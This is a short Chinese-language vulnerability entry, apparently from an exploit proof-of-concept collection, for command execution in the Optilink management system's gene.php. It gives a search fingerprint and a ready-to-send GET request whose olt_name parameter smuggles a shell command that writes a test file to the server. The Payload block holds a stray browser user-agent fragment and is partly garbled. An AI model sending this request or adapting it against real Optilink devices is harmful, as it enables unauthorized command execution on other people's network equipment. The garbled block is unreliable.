# Optilink管理系统gene.php任意命令执行漏洞

Optilink ｜ 命令执行 ｜ —
- **指纹**：`body="/html/css/dxtdata.css"`
- **请求**：`GET /cgi/fsystem/gene.php?olt_op=1&olt_name=;echo+DudeSuite>%20test123.txt;%20%23%20 HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
上传定位：/cgi/fsystem/test123.txt
```
- **响应特征**：200